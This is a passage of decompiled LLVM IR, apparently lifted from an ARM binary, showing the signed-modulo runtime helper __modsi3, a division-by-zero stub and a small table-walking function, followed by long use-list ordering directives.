  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_13500, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_134f4, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_134a0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1351c = icmp eq i32 %arg2, 0
  br i1 %v2_1351c, label %dec_label_pc_135f0, label %dec_label_pc_13524

dec_label_pc_13524:                               ; preds = %entry
  %v1_1351c = icmp slt i32 %arg2, 0
  br i1 %v1_1351c, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_13524
  %v2_13524 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13524, %bb
  %v4_1353c = phi i32 [ %arg2, %dec_label_pc_13524 ], [ %v2_13524, %bb ]
  %v0_13528 = load i32, i32* @r0, align 4
  %v1_13528 = icmp slt i32 %v0_13528, 0
  br i1 %v1_13528, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_1352c = sub i32 0, %v0_13528
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_13534 = phi i32 [ %v0_13528, %bb79 ], [ %v2_1352c, %bb80 ]
  %v1_13530 = add i32 %v4_1353c, -1
  %v7_13530 = icmp eq i32 %v4_1353c, 1
  br i1 %v7_13530, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_13534 = icmp eq i32 %v1_13534, %v4_1353c
  br i1 %v10_13534, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_13534 = icmp ult i32 %v1_13534, %v4_1353c
  br i1 %v4_13534, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_1353c = and i32 %v1_13530, %v4_1353c
  %v8_1353c = icmp eq i32 %v6_1353c, 0
  br i1 %v8_1353c, label %.thread72, label %dec_label_pc_1354c.preheader

dec_label_pc_1354c.preheader:                     ; preds = %bb84
  %v2_1354c109 = icmp ugt i32 %v4_1353c, 268435455
  br i1 %v2_1354c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1354064 = phi i32 [ %v1_13534, %bb84 ], [ 0, %.thread70 ]
  %v3_13540 = and i32 %v1_1354064, %v1_13530
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_1354c.preheader
  %v0_13560.pr35.lcssa = phi i32 [ %v4_1353c, %dec_label_pc_1354c.preheader ], [ %v4_13554, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_1354c.preheader ], [ %v2_135589, %.thread2.thread7 ]
  br label %dec_label_pc_13560thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_1354c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_135589, %.thread2.thread7 ], [ 0, %dec_label_pc_1354c.preheader ]
  %v0_13560.pr35110 = phi i32 [ %v4_13554, %.thread2.thread7 ], [ %v4_1353c, %dec_label_pc_1354c.preheader ]
  %v4_13550 = icmp ult i32 %v0_13560.pr35110, %v1_13534
  br i1 %v4_13550, label %bb86, label %dec_label_pc_13560thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_13554 = and i32 %v0_13560.pr35110, 268435456
  %v3_13554 = icmp eq i32 %v2_13554, 0
  %v4_13554 = mul i32 %v0_13560.pr35110, 16
  br i1 %v3_13554, label %.thread2.thread7, label %dec_label_pc_13560.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_135589 = add i32 %storemerge111, 4
  %v2_1354c = icmp ugt i32 %v4_13554, 268435455
  br i1 %v2_1354c, label %.thread1, label %bb85

dec_label_pc_13560thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_13560thread-pre-split.loopexit

dec_label_pc_13560thread-pre-split.loopexit:      ; preds = %dec_label_pc_13560thread-pre-split.loopexit.loopexit, %.thread1
  %v0_13560.pr35108 = phi i32 [ %v0_13560.pr35.lcssa, %.thread1 ], [ %v0_13560.pr35110, %dec_label_pc_13560thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_13560thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13560thread-pre-split

dec_label_pc_13560thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13560thread-pre-split.loopexit
  %v1_1356c41 = phi i32 [ %storemerge105, %dec_label_pc_13560thread-pre-split.loopexit ], [ %v2_1356c, %.thread4 ]
  %v2_1356436 = phi i32 [ %v1_13534, %dec_label_pc_13560thread-pre-split.loopexit ], [ %v2_13564, %.thread4 ]
  %v0_13560.pr = phi i32 [ %v0_13560.pr35108, %dec_label_pc_13560thread-pre-split.loopexit ], [ %v3_13568, %.thread4 ]
  br label %dec_label_pc_13560

dec_label_pc_13560.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_13560

dec_label_pc_13560:                               ; preds = %dec_label_pc_13560.loopexit, %dec_label_pc_13560thread-pre-split
  %v0_13574.pr = phi i32 [ %v1_1356c41, %dec_label_pc_13560thread-pre-split ], [ %storemerge111, %dec_label_pc_13560.loopexit ]
  %v2_13564 = phi i32 [ %v2_1356436, %dec_label_pc_13560thread-pre-split ], [ %v1_13534, %dec_label_pc_13560.loopexit ]
  %v1_13568 = phi i32 [ %v0_13560.pr, %dec_label_pc_13560thread-pre-split ], [ %v4_13554, %dec_label_pc_13560.loopexit ]
  %v2_13560 = icmp slt i32 %v1_13568, 0
  br i1 %v2_13560, label %dec_label_pc_13574, label %bb87

bb87:                                             ; preds = %dec_label_pc_13560
  %v4_13564 = icmp ult i32 %v1_13568, %v2_13564
  br i1 %v4_13564, label %.thread4, label %dec_label_pc_13574

.thread4:                                         ; preds = %bb87
  %v3_13568 = mul i32 %v1_13568, 2
  %v2_1356c = add i32 %v0_13574.pr, 1
  br label %dec_label_pc_13560thread-pre-split

dec_label_pc_13574:                               ; preds = %bb87, %dec_label_pc_13560
  %v2_13574 = add i32 %v0_13574.pr, -3
  %v5_13578 = icmp slt i32 %v0_13574.pr, 3
  br i1 %v5_13578, label %dec_label_pc_135b8, label %dec_label_pc_1357c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13574, %bb91
  %v6_135a4 = phi i32 [ %v0_135ac, %bb91 ], [ %v2_13574, %dec_label_pc_13574 ]
  %v1_13580 = phi i32 [ %v1_13588.v6_13588.v6_13590.v6_13598, %bb91 ], [ %v2_13564, %dec_label_pc_13574 ]
  %v3_135a010 = phi i32 [ %v3_135a0, %bb91 ], [ %v1_13568, %dec_label_pc_13574 ]
  %v3_1357c = icmp ult i32 %v1_13580, %v3_135a010
  %v3_13580 = select i1 %v3_1357c, i32 0, i32 %v3_135a010
  %v1_13588 = sub i32 %v1_13580, %v3_13580
  %v4_13584 = udiv i32 %v3_135a010, 2
  %v6_13584 = icmp ult i32 %v1_13588, %v4_13584
  %v6_13588 = select i1 %v6_13584, i32 0, i32 %v4_13584
  %v1_13588.v6_13588 = sub i32 %v1_13588, %v6_13588
  %.demorgan = and i1 %v3_1357c, %v6_13584
  %v4_1358c = udiv i32 %v3_135a010, 4
  %v6_1358c = icmp ult i32 %v1_13588.v6_13588, %v4_1358c
  %v6_13590 = select i1 %v6_1358c, i32 0, i32 %v4_1358c
  %v1_13588.v6_13588.v6_13590 = sub i32 %v1_13588.v6_13588, %v6_13590
  %.demorgan76 = and i1 %.demorgan, %v6_1358c
  %v4_13594 = udiv i32 %v3_135a010, 8
  %v6_13594 = icmp ult i32 %v1_13588.v6_13588.v6_13590, %v4_13594
  %v6_13598 = select i1 %v6_13594, i32 0, i32 %v4_13594
  %v1_13588.v6_13588.v6_13590.v6_13598 = sub i32 %v1_13588.v6_13588.v6_13590, %v6_13598
  %.demorgan77 = and i1 %.demorgan76, %v6_13594
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_1357c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_1357c, %bb88
  %v2_1359c = add i32 %v1_13588.v6_13588.v6_13590.v6_13598, -1
  %v4_1359c = sub i32 0, %v1_13588.v6_13588.v6_13590.v6_13598
  %v5_1359c = and i32 %v1_13588.v6_13588.v6_13590.v6_13598, %v4_1359c
  %v3_135a0 = udiv i32 %v3_135a010, 16
  %v5_135a4 = icmp slt i32 %v1_13588.v6_13588.v6_13590.v6_13598, 1
  br i1 %v5_135a4, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_135a4 = add i32 %v6_135a4, -4
  %v9_135a4 = sub i32 3, %v6_135a4
  %v10_135a4 = and i32 %v9_135a4, %v6_135a4
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_135ac = phi i32 [ %v6_135a4, %bb89 ], [ %v7_135a4, %bb90 ]
  %v0_135a813.in = phi i32 [ %v2_1359c, %bb89 ], [ %v7_135a4, %bb90 ]
  %v1_135a812.in = phi i32 [ %v5_1359c, %bb89 ], [ %v10_135a4, %bb90 ]
  %v1_135a812 = icmp slt i32 %v1_135a812.in, 0
  %v0_135a813 = icmp slt i32 %v0_135a813.in, 0
  %v2_135a8 = xor i1 %v0_135a813, %v1_135a812
  br i1 %v2_135a8, label %dec_label_pc_135ac, label %dec_label_pc_1357c

dec_label_pc_135ac:                               ; preds = %bb91
  %v1_135ac = urem i32 %v0_135ac, 4
  %v2_135ac = icmp eq i32 %v1_135ac, 0
  br i1 %v2_135ac, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_135ac
  %v3_135b0 = icmp eq i32 %v1_13588.v6_13588.v6_13590.v6_13598, 0
  br i1 %v3_135b0, label %.thread6, label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %bb92, %dec_label_pc_13574
  %v0_135cc = phi i32 [ %v3_135a0, %bb92 ], [ %v1_13568, %dec_label_pc_13574 ]
  %v1_135c8 = phi i32 [ %v1_13588.v6_13588.v6_13590.v6_13598, %bb92 ], [ %v2_13564, %dec_label_pc_13574 ]
  %v0_135b8 = phi i32 [ %v0_135ac, %bb92 ], [ %v2_13574, %dec_label_pc_13574 ]
  %v5_135bc = icmp slt i32 %v0_135b8, -2
  br i1 %v5_135bc, label %dec_label_pc_135dc, label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135b8
  %v8_135b8 = icmp eq i32 %v0_135b8, -2
  br i1 %v8_135b8, label %dec_label_pc_135d0, label %dec_label_pc_135c4

dec_label_pc_135c4:                               ; preds = %dec_label_pc_135c0
  %v3_135c4 = icmp ult i32 %v1_135c8, %v0_135cc
  br i1 %v3_135c4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_135c4
  %v2_135c4 = sub i32 %v1_135c8, %v0_135cc
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_135c4, %bb93
  %v0_135d054 = phi i32 [ %v1_135c8, %dec_label_pc_135c4 ], [ %v2_135c4, %bb93 ]
  %v3_135cc = udiv i32 %v0_135cc, 2
  br label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135c0, %bb94
  %v0_135d8 = phi i32 [ %v0_135cc, %dec_label_pc_135c0 ], [ %v3_135cc, %bb94 ]
  %v1_135d4 = phi i32 [ %v1_135c8, %dec_label_pc_135c0 ], [ %v0_135d054, %bb94 ]
  %v3_135d0 = icmp ult i32 %v1_135d4, %v0_135d8
  br i1 %v3_135d0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_135d0
  %v2_135d0 = sub i32 %v1_135d4, %v0_135d8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_135d0, %bb95
  %v0_135dc57 = phi i32 [ %v1_135d4, %dec_label_pc_135d0 ], [ %v2_135d0, %bb95 ]
  %v3_135d8 = udiv i32 %v0_135d8, 2
  br label %dec_label_pc_135dc

dec_label_pc_135dc:                               ; preds = %dec_label_pc_135b8, %bb96
  %v2_135e0 = phi i32 [ %v0_135cc, %dec_label_pc_135b8 ], [ %v3_135d8, %bb96 ]
  %v1_135e0 = phi i32 [ %v1_135c8, %dec_label_pc_135b8 ], [ %v0_135dc57, %bb96 ]
  %v3_135dc = icmp ult i32 %v1_135e0, %v2_135e0
  br i1 %v3_135dc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_135dc
  %v2_135dc = sub i32 %v1_135e0, %v2_135e0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_135dc, %bb83, %.thread72, %dec_label_pc_135ac, %bb92, %bb97
  %v1_135e8 = phi i32 [ %v1_13588.v6_13588.v6_13590.v6_13598, %dec_label_pc_135ac ], [ 0, %bb92 ], [ %v1_135e0, %dec_label_pc_135dc ], [ %v2_135dc, %bb97 ], [ %v3_13540, %.thread72 ], [ %v1_13534, %bb83 ]
  br i1 %v1_13528, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_135e8 = sub i32 0, %v1_135e8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_135ec = phi i32 [ %v1_135e8, %.thread6 ], [ %v2_135e8, %bb98 ]
  ret i32 %v1_135ec

dec_label_pc_135f0:                               ; preds = %entry
  %v0_135f0 = load i32, i32* @lr, align 4
  %v0_135f4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_135f0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_135cc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_135ac, { 1, 0, 2 }
  uselistorder i32 %v7_135a4, { 1, 0 }
  uselistorder i32 %v3_135a0, { 1, 0 }
  uselistorder i32 %v1_13588.v6_13588.v6_13590.v6_13598, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_13594, { 1, 0 }
  uselistorder i32 %v4_1358c, { 1, 0 }
  uselistorder i32 %v4_13584, { 1, 0 }
  uselistorder i32 %v6_135a4, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13574, { 1, 0 }
  uselistorder i32 %v1_13568, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_13564, { 1, 0, 3, 2 }
  uselistorder i32 %v4_13554, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13560.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13534, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_1353c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 9, 10, 11, 5, 1, 2, 0, 6, 3, 4, 7, 8 }
  uselistorder i32 -2, { 0, 12, 1, 13, 2, 3, 10, 8, 9, 7, 6, 5, 4, 20, 21, 22, 11, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 8, { 6, 7, 44, 17, 8, 9, 14, 10, 32, 52, 25, 11, 12, 13, 47, 33, 51, 24, 53, 54, 55, 56, 58, 34, 59, 35, 60, 61, 57, 36, 37, 38, 39, 62, 23, 46, 26, 63, 64, 65, 66, 67, 18, 68, 69, 70, 71, 3, 72, 73, 74, 4, 75, 76, 77, 78, 79, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 27, 92, 28, 93, 29, 94, 40, 95, 43, 96, 97, 41, 98, 0, 1, 2, 15, 19, 20, 99, 16, 21, 22, 100, 42, 48, 49, 101, 102, 104, 103, 105, 106, 30, 107, 45, 50, 31, 108 }
  uselistorder i32 3, { 54, 19, 55, 20, 143, 56, 32, 21, 22, 65, 35, 66, 2, 67, 68, 69, 70, 33, 18, 71, 72, 73, 1, 36, 74, 37, 75, 23, 76, 38, 77, 34, 78, 39, 40, 41, 0, 79, 80, 81, 82, 83, 84, 85, 86, 42, 87, 43, 88, 44, 24, 89, 90, 91, 92, 93, 5, 4, 45, 25, 94, 95, 96, 97, 98, 99, 100, 7, 6, 46, 101, 26, 102, 103, 104, 105, 106, 107, 108, 109, 9, 8, 47, 110, 27, 111, 112, 113, 114, 115, 11, 10, 48, 116, 28, 117, 118, 119, 120, 49, 121, 13, 12, 50, 122, 29, 123, 124, 125, 126, 127, 128, 15, 14, 51, 129, 30, 130, 131, 132, 133, 134, 135, 136, 17, 16, 52, 137, 31, 138, 139, 3, 140, 141, 57, 61, 58, 62, 59, 63, 60, 64, 53, 142 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 123, 12, 13, 14, 15, 16, 74, 75, 44, 45, 76, 139, 77, 79, 126, 80, 127, 133, 57, 125, 58, 128, 59, 129, 60, 130, 61, 131, 62, 132, 63, 138, 134, 135, 136, 137, 53, 81, 140, 17, 18, 141, 143, 82, 144, 48, 124, 43, 145, 78, 146, 19, 83, 142, 87, 147, 85, 148, 86, 149, 84, 88, 150, 20, 21, 22, 89, 151, 54, 90, 91, 92, 93, 55, 95, 96, 94, 64, 97, 98, 99, 152, 46, 51, 153, 154, 155, 211, 212, 156, 157, 158, 159, 160, 161, 162, 100, 163, 65, 164, 165, 166, 167, 168, 101, 66, 169, 170, 171, 172, 173, 174, 175, 102, 176, 67, 177, 178, 103, 104, 179, 180, 181, 182, 183, 184, 185, 186, 0, 23, 24, 25, 26, 27, 28, 105, 187, 68, 188, 189, 190, 191, 192, 1, 29, 30, 31, 32, 33, 34, 106, 69, 193, 194, 195, 196, 107, 197, 49, 198, 71, 199, 2, 35, 36, 37, 38, 39, 40, 108, 200, 70, 201, 202, 203, 204, 205, 206, 207, 208, 109, 209, 72, 210, 213, 214, 215, 110, 216, 111, 217, 218, 219, 220, 112, 221, 73, 222, 223, 52, 56, 224, 47, 113, 225, 226, 120, 227, 121, 228, 114, 229, 115, 116, 230, 117, 231, 118, 232, 119, 233, 50, 234, 41, 42, 235, 122, 236 }
  uselistorder i32 4, { 5, 6, 55, 7, 8, 56, 342, 343, 148, 9, 10, 79, 63, 314, 315, 47, 151, 80, 152, 177, 178, 82, 153, 83, 154, 84, 155, 171, 172, 179, 180, 156, 157, 149, 150, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 81, 174, 175, 176, 173, 57, 181, 182, 64, 85, 11, 183, 12, 184, 185, 13, 14, 186, 187, 41, 188, 42, 193, 86, 194, 87, 196, 88, 197, 198, 195, 189, 89, 190, 191, 192, 199, 53, 52, 51, 200, 90, 15, 16, 17, 18, 19, 20, 201, 43, 202, 44, 203, 204, 205, 0, 91, 206, 207, 111, 208, 209, 210, 211, 112, 113, 93, 212, 54, 21, 92, 213, 65, 214, 215, 114, 216, 217, 115, 116, 218, 94, 219, 66, 220, 221, 117, 118, 222, 119, 223, 224, 120, 121, 58, 225, 95, 226, 67, 227, 228, 229, 230, 231, 232, 96, 68, 233, 234, 122, 235, 236, 237, 238, 123, 124, 2, 239, 97, 240, 69, 241, 242, 243, 125, 244, 245, 126, 127, 3, 59, 246, 98, 247, 70, 248, 249, 250, 251, 128, 129, 252, 253, 254, 130, 255, 256, 99, 257, 4, 258, 71, 259, 100, 260, 261, 262, 131, 263, 264, 265, 266, 267, 132, 133, 101, 268, 60, 72, 269, 73, 270, 271, 272, 134, 273, 274, 275, 102, 276, 103, 277, 278, 279, 280, 135, 136, 104, 281, 61, 282, 74, 283, 75, 284, 137, 285, 286, 22, 138, 287, 288, 23, 139, 289, 290, 24, 140, 291, 292, 25, 141, 293, 294, 26, 295, 142, 296, 297, 27, 143, 298, 299, 28, 144, 300, 301, 29, 145, 302, 303, 30, 146, 304, 305, 31, 306, 147, 307, 308, 309, 310, 32, 311, 312, 1, 316, 313, 317, 339, 110, 318, 78, 319, 320, 62, 321, 105, 322, 323, 324, 325, 76, 326, 106, 327, 328, 329, 77, 330, 107, 331, 33, 34, 35, 332, 333, 50, 49, 48, 334, 36, 37, 38, 108, 335, 109, 336, 39, 40, 337, 45, 338, 46, 340, 341 }
  uselistorder i32 16, { 4, 5, 6, 7, 8, 22, 9, 10, 0, 11, 12, 39, 66, 40, 31, 41, 32, 42, 33, 43, 64, 65, 67, 68, 69, 23, 63, 70, 44, 71, 45, 72, 13, 14, 21, 61, 15, 73, 16, 46, 28, 74, 34, 75, 35, 47, 48, 49, 50, 51, 24, 76, 77, 78, 79, 25, 80, 81, 82, 83, 84, 85, 86, 29, 87, 88, 89, 53, 90, 36, 52, 91, 92, 54, 93, 94, 95, 17, 96, 97, 1, 55, 98, 99, 100, 56, 101, 102, 103, 104, 2, 57, 105, 106, 18, 107, 62, 19, 108, 58, 109, 110, 111, 20, 30, 112, 59, 113, 114, 3, 37, 115, 116, 117, 118, 119, 120, 26, 121, 122, 123, 124, 126, 125, 127, 128, 129, 130, 131, 132, 133, 27, 134, 135, 136, 137, 138, 140, 139, 141, 142, 143, 60, 144, 38, 145, 146, 147, 148, 149 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_135dc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_135d0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_1357c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_13600 = load i32, i32* @r0, align 4
  ret i32 %v1_13600
}

define i32 @function_13604(i32 %arg1) local_unnamed_addr {
dec_label_pc_13604:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13608 = load i32, i32* @global_var_1c000.623, align 4
  %v7_1360c = icmp eq i32 %v3_13608, -1
  %v3_13610 = load i32, i32* @r4, align 4
  store i32 %v3_13610, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1c000.623 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1360c, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_13604
  store i32 %v3_13610, i32* %r4.global-to-local, align 4
  %v9_13618 = load i32, i32* @r0, align 4
  ret i32 %v9_13618

.preheader:                                       ; preds = %dec_label_pc_13604, %.preheader
  %v0_13620 = phi i32 [ %v3_13624, %.preheader ], [ %v3_13608, %dec_label_pc_13604 ]
  call void @__pseudo_branch(i32 %v0_13620)
  %v0_13624 = load i32, i32* %r4.global-to-local, align 4
  %v1_13624 = add i32 %v0_13624, -4
  %v2_13624 = inttoptr i32 %v1_13624 to i32*
  %v3_13624 = load i32, i32* %v2_13624, align 4
  store i32 %v1_13624, i32* %r4.global-to-local, align 4
  %v3_13628 = icmp eq i32 %v3_13624, -1
  br i1 %v3_13628, label %dec_label_pc_13630, label %.preheader

dec_label_pc_13630:                               ; preds = %.preheader
  %v2_13630 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13630, i32* %r4.global-to-local, align 4
  %v8_13630 = load i32, i32* @r0, align 4
  ret i32 %v8_13630

; uselistorder directives
  uselistorder i32 %v3_13624, { 1, 0 }
  uselistorder i32 %v3_13608, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 12, 0, 1, 6, 7, 8, 2, 3, 9, 4, 5, 10, 11 }
  uselistorder i32 -1, { 97, 0, 98, 99, 100, 101, 102, 103, 104, 105, 1, 2, 3, 4, 5, 74, 75, 6, 106, 202, 12, 107, 13, 108, 8, 109, 110, 203, 7, 111, 69, 14, 112, 113, 11, 114, 115, 116, 199, 200, 117, 118, 119, 197, 76, 198, 15, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 201, 9, 140, 10, 141, 142, 143, 16, 144, 145, 77, 204, 146, 17, 147, 205, 70, 67, 68, 18, 19, 22, 80, 206, 21, 82, 207, 20, 81, 208, 23, 24, 83, 209, 25, 26, 27, 28, 29, 148, 30, 71, 31, 32, 34, 149, 79, 33, 72, 35, 36, 37, 38, 39, 40, 41, 150, 42, 78, 43, 44, 46, 151, 45, 47, 48, 49, 50, 152, 51, 52, 53, 153, 54, 55, 56, 154, 57, 58, 59, 60, 61, 155, 62, 63, 64, 156, 65, 66, 73, 157, 158, 159, 160, 210, 211, 89, 212, 87, 213, 88, 214, 85, 215, 161, 162, 163, 164, 165, 90, 216, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 84, 217, 91, 218, 192, 193, 194, 92, 195, 196, 86, 219, 93, 220, 94, 95, 96 }
  uselistorder i32 1, { 413, 153, 283, 776, 777, 284, 778, 779, 234, 780, 677, 678, 679, 239, 680, 416, 415, 414, 186, 188, 191, 192, 187, 194, 190, 189, 193, 0, 681, 682, 683, 684, 10, 9, 1, 685, 686, 687, 688, 247, 689, 690, 248, 691, 418, 417, 225, 226, 563, 564, 565, 316, 419, 19, 18, 17, 15, 16, 692, 256, 257, 2, 3, 693, 694, 696, 695, 317, 697, 223, 222, 664, 224, 698, 699, 700, 21, 20, 22, 701, 527, 420, 38, 40, 41, 42, 43, 45, 44, 39, 702, 703, 421, 157, 156, 155, 154, 158, 159, 704, 705, 422, 142, 141, 140, 139, 143, 144, 318, 504, 319, 505, 285, 506, 507, 328, 508, 528, 329, 330, 518, 519, 524, 327, 502, 503, 509, 325, 510, 511, 326, 512, 513, 324, 514, 515, 323, 516, 517, 322, 520, 521, 321, 522, 523, 320, 525, 526, 529, 331, 244, 530, 332, 531, 533, 534, 532, 535, 333, 536, 501, 258, 539, 537, 334, 538, 541, 335, 542, 543, 276, 544, 545, 243, 259, 551, 552, 240, 336, 435, 434, 433, 432, 431, 430, 429, 428, 427, 426, 407, 425, 424, 423, 197, 201, 202, 203, 208, 200, 206, 207, 199, 198, 204, 205, 546, 547, 337, 548, 549, 338, 550, 436, 170, 168, 169, 162, 161, 165, 167, 166, 164, 160, 163, 540, 339, 438, 437, 228, 230, 227, 229, 650, 440, 439, 68, 69, 67, 66, 65, 70, 441, 342, 286, 553, 554, 287, 555, 340, 341, 343, 556, 557, 344, 345, 346, 348, 347, 349, 350, 351, 453, 452, 451, 450, 449, 448, 447, 446, 445, 411, 444, 443, 442, 180, 182, 183, 181, 185, 184, 241, 352, 355, 354, 353, 558, 455, 454, 145, 559, 456, 356, 357, 358, 560, 561, 359, 260, 562, 242, 360, 460, 459, 458, 457, 64, 63, 571, 5, 566, 361, 567, 4, 568, 277, 569, 245, 246, 570, 572, 278, 573, 465, 464, 463, 408, 462, 409, 461, 195, 196, 651, 288, 652, 289, 653, 6, 654, 7, 8, 574, 575, 576, 577, 578, 579, 580, 581, 279, 582, 583, 584, 585, 362, 586, 363, 587, 364, 588, 589, 590, 591, 592, 468, 467, 466, 214, 213, 212, 209, 211, 217, 218, 221, 219, 210, 216, 220, 215, 593, 594, 595, 596, 597, 365, 366, 470, 469, 104, 101, 98, 99, 100, 102, 108, 109, 103, 106, 107, 105, 598, 599, 600, 367, 601, 602, 603, 604, 605, 606, 368, 607, 369, 291, 290, 370, 608, 471, 128, 129, 127, 130, 131, 132, 137, 133, 136, 138, 135, 134, 609, 610, 371, 611, 372, 373, 293, 292, 410, 472, 12, 13, 11, 14, 612, 613, 249, 614, 615, 616, 617, 374, 618, 250, 375, 376, 619, 294, 620, 473, 28, 31, 24, 25, 27, 26, 32, 33, 36, 34, 30, 35, 29, 621, 622, 623, 624, 625, 377, 626, 378, 296, 295, 379, 627, 380, 628, 474, 148, 150, 151, 152, 149, 147, 146, 629, 630, 631, 632, 633, 634, 635, 381, 636, 382, 637, 383, 301, 300, 384, 638, 297, 639, 298, 640, 299, 641, 479, 478, 477, 476, 475, 174, 171, 176, 177, 179, 178, 172, 175, 173, 642, 643, 644, 645, 646, 647, 385, 304, 303, 386, 648, 302, 649, 480, 91, 89, 90, 87, 86, 85, 93, 94, 97, 95, 88, 96, 92, 655, 656, 657, 658, 659, 660, 387, 307, 306, 388, 661, 305, 662, 485, 484, 483, 482, 481, 77, 75, 76, 73, 72, 71, 80, 81, 84, 82, 74, 79, 83, 78, 663, 308, 389, 486, 55, 54, 56, 60, 57, 59, 62, 61, 58, 665, 666, 390, 261, 391, 669, 392, 393, 670, 667, 668, 671, 672, 673, 674, 251, 675, 252, 49, 51, 50, 48, 53, 46, 47, 52, 706, 23, 676, 110, 707, 37, 708, 235, 397, 268, 269, 709, 236, 395, 270, 271, 396, 710, 262, 711, 267, 712, 237, 272, 400, 273, 281, 238, 398, 274, 275, 399, 713, 263, 714, 715, 315, 716, 717, 718, 310, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 311, 731, 732, 733, 734, 735, 254, 736, 401, 737, 402, 403, 738, 739, 740, 741, 742, 312, 743, 744, 745, 264, 746, 313, 747, 748, 749, 265, 750, 314, 751, 752, 753, 266, 754, 755, 756, 757, 255, 758, 759, 760, 253, 394, 309, 761, 763, 765, 764, 762, 404, 766, 767, 768, 405, 769, 770, 771, 772, 282, 773, 774, 280, 406, 775, 498, 497, 